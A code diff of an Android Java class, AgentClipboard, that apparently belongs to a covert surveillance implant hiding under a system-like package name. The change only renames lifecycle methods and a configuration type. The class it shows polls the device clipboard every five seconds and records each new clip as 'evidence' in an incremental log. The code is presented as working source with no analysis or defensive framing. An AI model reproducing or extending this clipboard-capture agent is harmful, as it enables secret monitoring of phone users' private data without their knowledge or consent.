@@ -17,6 +17,7 @@ import android.text.ClipboardManager;
 import com.android.service.LogR;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAgent;
 import com.android.service.evidence.Evidence;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.interfaces.IncrementalLog;
@@ -35,7 +36,7 @@ public class AgentClipboard extends BaseAgent implements IncrementalLog {
 	LogR logIncremental;
 
 	@Override
-	public void begin() {
+	public void actualStart() {
 		logIncremental = new LogR(EvidenceType.CLIPBOARD);
 		clipboardManager = (ClipboardManager) Status.getAppContext().getSystemService(Context.CLIPBOARD_SERVICE);
 		if (Cfg.DEBUG) {
@@ -44,19 +45,19 @@ public class AgentClipboard extends BaseAgent implements IncrementalLog {
 	}
 
 	@Override
-	public void end() {
+	public void actualStop() {
 		clipboardManager = null;
 		logIncremental.close();
 	}
 
 	@Override
-	public boolean parse(AgentConf conf) {
+	public boolean parse(ConfAgent conf) {
 		setPeriod(5000);
 		return true;
 	}
 
 	@Override
-	public void go() {
+	public void actualGo() {
 
 		final String ret = clipboardManager.getText().toString();
 		if (ret != null && !ret.equals(lastClip)) {
